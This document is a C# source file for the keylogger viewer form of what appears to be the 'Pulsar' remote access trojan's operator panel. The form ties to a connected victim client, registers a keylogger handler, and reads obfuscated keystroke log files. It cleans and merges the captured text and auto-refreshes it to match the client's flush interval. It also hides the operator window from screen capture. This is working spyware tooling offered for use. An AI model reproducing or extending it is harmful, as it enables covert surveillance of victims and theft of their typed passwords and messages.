using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly KeyloggerHandler _keyloggerHandler;
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new();

        private readonly Timer autoRefreshTimer = new();
        private StringBuilder currentLogCache = new();
        private string _previousContent = string.Empty;
        private readonly object _contentLock = new object();
        private DateTime _lastRefreshTime = DateTime.MinValue;
        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(500);
        private FileSystemWatcher _fileWatcher;
        private string _currentWatchedFile;

        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var existingForm))
                return existingForm;

            var form = new FrmKeylogger(client);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms.Add(client, form);
            return form;
        }

        public FrmKeylogger(Client client)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _keyloggerHandler = new KeyloggerHandler(client);

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            RegisterMessageHandler();

            // SYNC WITH CLIENT: 3-second refresh to match keylogger flush interval
            autoRefreshTimer.Interval = 3000;
            autoRefreshTimer.Tick += AutoRefreshTimer_Tick;

            InitializeFileWatcher();
        }

        private void InitializeFileWatcher()
        {
            _fileWatcher = new FileSystemWatcher
            {
                Path = Path.GetTempPath(),
                Filter = "*.txt",
                NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size,
                EnableRaisingEvents = false
            };

            _fileWatcher.Changed += FileWatcher_Changed;
        }

        private void FileWatcher_Changed(object sender, FileSystemEventArgs e)
        {
            if (e.ChangeType == WatcherChangeTypes.Changed &&
                e.FullPath == _currentWatchedFile &&
                lstLogs.SelectedItems.Count > 0)
            {
                System.Threading.Thread.Sleep(100); // small delay to ensure file is not locked
                SafeInvoke(RefreshSelectedLog);
            }
        }

        private void AutoRefreshTimer_Tick(object sender, EventArgs e)
        {
            if (checkBox1.Checked && lstLogs.SelectedItems.Count > 0)
                RefreshSelectedLog();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                SafeInvoke(Close);
        }

        private void LogsChanged(object? sender, string message)
        {
            SafeInvoke(RefreshLogsDirectory);
        }
        private void ApplyGreenToHeaders()
        {
            // Regex to match lines starting with [HH:MM:SS]
            var regex = new System.Text.RegularExpressions.Regex(@"^\[\d{2}:\d{2}:\d{2}\].*$",
                System.Text.RegularExpressions.RegexOptions.Multiline);

            foreach (System.Text.RegularExpressions.Match match in regex.Matches(rtbLogViewer.Text))
            {
                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.LimeGreen; // make the whole line green
            }

            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor; // reset default color for normal text
        }
        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
            RefreshLogsDirectory();

            if (lstLogs.Items.Count > 0)
            {
                lstLogs.Items[0].Selected = true;
                lstLogs.Focus();
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
            _fileWatcher?.Dispose();
            autoRefreshTimer.Stop();
            autoRefreshTimer.Dispose();
        }

        private void lstLogs_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            RefreshSelectedLog();
        }

        private void UpdateFileWatcher()
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                _currentWatchedFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
                _fileWatcher.EnableRaisingEvents = checkBox1.Checked;
            }
            else
                _fileWatcher.EnableRaisingEvents = false;
        }

        private void RefreshLogsDirectory()
        {
            string previouslySelected = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;

            SafeInvoke(() =>
            {
                lstLogs.Items.Clear();
                try
                {
                    var files = new DirectoryInfo(Path.GetTempPath())
                        .GetFiles("*.txt")
                        .OrderByDescending(f => f.LastWriteTime);

                    foreach (var file in files)
                        lstLogs.Items.Add(new ListViewItem(file.Name));

                    if (!string.IsNullOrEmpty(previouslySelected))
                    {
                        var item = lstLogs.Items.Cast<ListViewItem>()
                            .FirstOrDefault(i => i.Text == previouslySelected);
                        if (item != null)
                        {
                            item.Selected = true;
                            lstLogs.Focus();
                        }
                    }
                    else if (lstLogs.Items.Count > 0)
                    {
                        lstLogs.Items[0].Selected = true;
                        lstLogs.Focus();
                    }

                    UpdateFileWatcher();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Refresh logs error: {ex.Message}");
                }
            });
        }

        private void RefreshSelectedLog()
        {
            if (lstLogs.SelectedItems.Count == 0) return;

            string logFilePath = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);

            Task.Run(() =>
            {
                try
                {
                    if (!File.Exists(logFilePath))
                    {
                        SafeInvoke(() => rtbLogViewer.Text = "Log file not found.");
                        return;
                    }

                    string logContent = ReadFileWithRetry(logFilePath);
                    if (logContent == null) return;

                    // Remove spam & duplicates, then merge broken lines
                    string filteredContent = FilterAndDeduplicateLog(logContent);
                    filteredContent = MergeBrokenLines(filteredContent);

                    lock (_contentLock)
                    {
                        if (filteredContent != currentLogCache.ToString())
                        {
                            currentLogCache.Clear();
                            currentLogCache.Append(filteredContent);

                            SafeInvoke(() =>
                            {
                                rtbLogViewer.Clear();
                                rtbLogViewer.Text = currentLogCache.ToString();

                                // Color any line starting with [HH:MM:SS] green
                                ApplyGreenToHeaders();

                                rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
                                rtbLogViewer.ScrollToCaret();
                            });

                        }
                    }
                }
                catch (Exception ex)
                {
                    SafeInvoke(() => rtbLogViewer.Text = $"Error loading log file: {ex.Message}");
                }
            });
        }

        private string ReadFileWithRetry(string filePath, int maxRetries = 3)
        {
            for (int i = 0; i < maxRetries; i++)
            {
                try
                {
                    return FileHelper.ReadObfuscatedLogFile(filePath);
                }
                catch (IOException) when (i < maxRetries - 1)
                {
                    System.Threading.Thread.Sleep(50);
                }
            }
            return null;
        }

        private string FilterAndDeduplicateLog(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var seen = new HashSet<string>();
            var result = new List<string>();

            foreach (var line in lines)
            {
                var trimmed = line.Trim();

                if (trimmed.StartsWith("Log created on") ||
                    trimmed.StartsWith("Session started at:") ||
                    trimmed.StartsWith("========================================"))
                    continue;

                if (!seen.Contains(trimmed))
                {
                    result.Add(trimmed);
                    seen.Add(trimmed);
                }
            }

            return string.Join(Environment.NewLine, result);
        }

        private string MergeBrokenLines(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var merged = new StringBuilder();

            string currentHeader = null;
            StringBuilder textBuffer = new StringBuilder();

            foreach (var line in lines)
            {
                var trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) continue;

                // Detect timestamp + window line
                if (trimmed.StartsWith("[") && trimmed.Contains("]"))
                {
                    // Flush previous text buffer
                    if (currentHeader != null && textBuffer.Length > 0)
                    {
                        string mergedText = textBuffer.ToString()
                            .Replace("  ", " ")         // collapse double spaces
                            .Replace(" \n", "\n")       // fix spaces before line breaks
                            .Trim();

                        merged.AppendLine(currentHeader);
                        merged.AppendLine(mergedText);
                        textBuffer.Clear();
                    }

                    // Avoid duplicate consecutive headers
                    if (currentHeader != trimmed)
                        currentHeader = trimmed;
                }
                else
                {
                    // Fix accidental letter splits like "t o" -> "to", "b etween" -> "between"
                    string fixedLine = System.Text.RegularExpressions.Regex.Replace(
                        trimmed, @"(\b\w)\s+(\w\b)", "$1$2"
                    );

                    if (textBuffer.Length > 0)
                        textBuffer.Append(" " + fixedLine);
                    else
                        textBuffer.Append(fixedLine);
                }
            }

            // Flush final buffer
            if (currentHeader != null)
            {
                merged.AppendLine(currentHeader);
                if (textBuffer.Length > 0)
                {
                    string mergedText = textBuffer.ToString()
                        .Replace("  ", " ")
                        .Trim();
                    merged.AppendLine(mergedText);
                }
            }

            return merged.ToString();
        }

        private void SafeInvoke(Action action)
        {
            if (InvokeRequired)
                Invoke(action);
            else
                action();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            RefreshSelectedLog();
        }

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                autoRefreshTimer.Start();
                _fileWatcher.EnableRaisingEvents = true;
            }
            else
            {
                autoRefreshTimer.Stop();
                _fileWatcher.EnableRaisingEvents = false;
            }
        }
    }
}
